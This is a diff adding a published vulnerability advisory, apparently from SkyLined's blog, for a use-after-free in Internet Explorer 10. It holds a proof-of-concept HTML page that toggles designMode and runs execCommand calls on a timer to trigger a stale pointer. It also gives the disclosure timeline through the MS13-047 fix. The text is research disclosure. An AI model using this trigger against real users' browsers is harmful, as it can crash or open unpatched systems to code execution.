@@ -1,0 +1,55 @@
+<!--
+Source: http://blog.skylined.nl/20161125001.html
+
+Synopsis
+
+A specially crafted web-page can cause Microsoft Internet Explorer 10 to continue to use an object after freeing the memory used to store the object. An attacker might be able to exploit this issue to execute arbitrary code.
+
+Known affected software and attack vectors
+
+Microsoft Internet Explorer 10
+
+An attacker would need to get a target user to open a specially crafted web-page. Disabling Javascript should prevent an attacker from triggering the vulnerable code path.
+
+Repro.html:
+-->
+
+<!DOCTYPE html>
+<html>
+  <head>
+    <script>
+      var o­Window = window.open("window.xhtml");
+      set­Interval(function () {
+        try {
+          o­Window.eval("(" + function () {
+            document.design­Mode = "on";
+            document.exec­Command("Select­All");
+            var o­Selection = window.get­Selection();
+            o­Selection.collapse(document,1);
+            document.exec­Command("Insert­Image", false);
+            document.design­Mode="off";
+          } + ")()");
+        } catch (e) {}
+      }, 1);
+    </script>
+  </head>
+</html>
+Window.xhtml
+<!-- comment --><html xmlns="http://www.w3.org/1999/xhtml">
+</html>
+
+<!--
+Description
+
+The last line of script (design­Mode = "off") will cause some cleanup in MSIE, which appears to trigger use of a stale pointer in CEdit­Adorner::Detach. I did not investigate further.
+
+Time-line
+
+November 2012: This vulnerability was found through fuzzing.
+November 2012: This vulnerability was submitted to EIP.
+December 2012: This vulnerability was rejected by EIP.
+January 2013: This vulnerability was submitted to ZDI.
+March 2013: This vulnerability was acquired by ZDI.
+June 2013: This issue was addressed by Microsoft in MS13-047.
+November 2016: Details of this issue are released.
+-->
